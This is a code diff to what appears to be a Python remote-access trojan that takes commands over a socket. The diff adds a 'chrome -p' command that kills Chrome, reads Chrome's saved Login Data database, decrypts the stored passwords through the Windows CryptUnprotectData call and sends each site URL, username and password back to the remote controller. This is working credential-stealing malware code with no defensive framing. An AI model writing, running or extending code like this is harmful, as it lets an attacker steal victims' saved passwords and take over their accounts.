@@ -13,6 +13,8 @@ import struct
 import webbrowser
 from psutil import virtual_memory
 import tkinter as tk
+import sqlite3
+import win32crypt
 
 GREEN = '\33[32m'
 RED = '\33[31m'
@@ -118,6 +120,40 @@ def recieveCommands():
                 s.send(str.encode(virtualram))
             except:
                 error = RED + BOLD + "[!] Couldn't get virtual ram" + END + '\n'
+                s.send(str.encode(error))
+        elif data[:].decode("utf-8") == 'chrome -p':
+            try:
+                chromePath = r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
+
+                def close_chrome():
+                    try:
+                        os.system("TASKKILL /F /IM chrome.exe")
+                    except:
+                        pass
+
+                def get_chrome():
+                    data_path = os.path.expanduser('~') + chromePath
+                    c = sqlite3.connect(data_path)
+                    cursor = c.cursor()
+                    select_statement = 'SELECT origin_url, username_value, password_value FROM Logins'
+                    cursor.execute(select_statement)
+
+                    login_data = cursor.fetchall()
+                    cred = {}
+
+                    string = ''
+
+                    for url, user_name, pwd in login_data:
+                        pwd = win32crypt.CryptUnprotectData(pwd)
+                        cred[url] = (user_name, pwd[1].decode('utf8'))
+                        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
+                        s.send(str.encode(string))
+
+                close_chrome()
+                get_chrome()
+
+            except:
+                error = '\n' + RED + BOLD + '[!] There was an error getting saved chrome passwords' + END + '\n'
                 s.send(str.encode(error))
         elif data[:4].decode("utf-8") == 'lock':
             try:
